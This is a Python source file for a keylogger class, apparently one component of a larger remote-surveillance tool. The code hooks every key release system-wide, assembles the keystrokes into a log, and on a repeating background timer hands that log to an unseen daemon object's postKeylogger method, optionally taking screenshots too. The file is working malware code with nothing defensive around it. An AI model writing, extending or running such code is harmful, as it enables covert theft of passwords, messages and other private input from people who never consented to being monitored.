import keyboard
from threading import Timer
from datetime import datetime

class Keylogger:
	def __init__(self, interval, daemon, useScreenshot):
		# we gonna pass SEND_REPORT_EVERY to interval
		self.interval = interval
		# this is the string variable that contains the log of all 
		# the keystrokes within `self.interval`
		self.log = ""
		# record start & end datetimes
		self.start_dt = datetime.now()
		self.end_dt = datetime.now()
		self.daemon = daemon
		self.useScreenshot = useScreenshot

	def callback(self, event):
		"""
		This callback is invoked whenever a keyboard event is occured
		(i.e when a key is released in this example)
		"""
		name = event.name
		if len(name) > 1:
			# not a character, special key (e.g ctrl, alt, etc.)
			# uppercase with []
			if name == "space":
				# " " instead of "space"
				name = " "
			elif name == "enter":
				# add a new line whenever an ENTER is pressed
				name = "[ENTER]\n"
			elif name == "decimal":
				name = "."
			else:
				# replace spaces with underscores
				name = name.replace(" ", "_")
				name = f"[{name.upper()}]"
		# finally, add the key name to our global `self.log` variable
		self.log += name

	def report(self):
		"""
		This function gets called every `self.interval`
		It basically sends keylogs and resets `self.log` variable
		"""
		if self.log:
			# if there is something in log, report it
			self.end_dt = datetime.now()
			# update `self.filename`
			self.daemon.postKeylogger(self.log)
			# if you want to print in the console, uncomment below line
			# print(f"[{self.filename}] - {self.log}")
			self.start_dt = datetime.now()
		self.log = ""
		if self.useScreenshot:
			self.daemon.takeScreenshot(False)
		timer = Timer(interval=self.interval, function=self.report)
		# set the thread as daemon (dies when main thread die)
		timer.daemon = True
		# start the timer
		timer.start()

	def start(self):
		# record the start datetime
		self.start_dt = datetime.now()
		# start the keylogger
		keyboard.on_release(callback=self.callback)
		# start reporting the keylogs
		self.report()

